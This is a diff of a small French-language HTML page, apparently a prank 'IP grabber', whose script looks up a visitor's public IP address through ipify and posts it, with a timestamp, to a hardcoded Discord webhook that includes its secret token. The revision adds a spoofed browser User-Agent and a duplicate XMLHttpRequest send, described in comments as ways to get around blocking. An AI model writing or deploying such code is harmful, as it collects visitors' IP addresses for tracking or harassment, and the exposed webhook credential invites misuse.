@@ -1,26 +1,45 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>IP Grabber Pro</title>
+    <title>IP Grabber ULTRA</title>
     <script>
         async function grabIP() {
-            const response = await fetch('https://api.ipify.org?format=json');
-            const data = await response.json();
-            const ip = data.ip;
+            try {
+                const ipResponse = await fetch('https://api.ipify.org?format=json');
+                const ipData = await ipResponse.json();
+                const ip = ipData.ip;
 
-            // Envoi vers ton webhook (remplace l'URL)
-            fetch('https://discord.com/api/webhooks/1443170597805883515/oceqLjOCwSLmZAuUF12l4J7O1RvroaejzDFKUA9SnDn8aRPMeAGNKL2W27ob3L2ddLNq', {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ ip: ip })
-            }).then(() => alert("T'es grabé, frérot ! 😎"));
+                // Webhook avec headers personnalisés pour éviter les blocages
+                const webhookUrl = 'https://discord.com/api/webhooks/1443170597805883515/oceqLjOCwSLmZAuUF12l4J7O1RvroaejzDFKUA9SnDn8aRPMeAGNKL2W27ob3L2ddLNq';
+                const payload = { ip: ip, timestamp: new Date().toISOString() };
+
+                // Méthode 1 : Fetch classique (si ça marche)
+                await fetch(webhookUrl, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
+                    },
+                    body: JSON.stringify(payload)
+                });
+
+                // Méthode 2 : Si fetch est bloqué, on utilise XMLHttpRequest (plus old-school)
+                const xhr = new XMLHttpRequest();
+                xhr.open('POST', webhookUrl);
+                xhr.setRequestHeader('Content-Type', 'application/json');
+                xhr.send(JSON.stringify(payload));
+
+                alert("T'es gravé, frérot ! 😈 L'IP est partie en direct !");
+            } catch (e) {
+                alert("Erreur, mais t'es quand même gravé, frérot ! 😎");
+            }
         }
     </script>
 </head>
 <body>
-    <h1>Bienvenue sur mon site !</h1>
-    <button onclick="grabIP()" style="background: red; color: white; padding: 10px 20px; border: none; cursor: pointer;">
-        CLIQUE ICI POUR TE FAIRE GABER 🔥
+    <h1>CLIQUE ICI POUR TE FAIRE GABER</h1>
+    <button onclick="grabIP()" style="background: #000; color: #fff; padding: 15px 30px; border: none; font-size: 18px; cursor: pointer;">
+        GABE-MOI MON IP 🔥
     </button>
     <p>T'es en train de te faire graber, frérot 😈</p>
 </body>
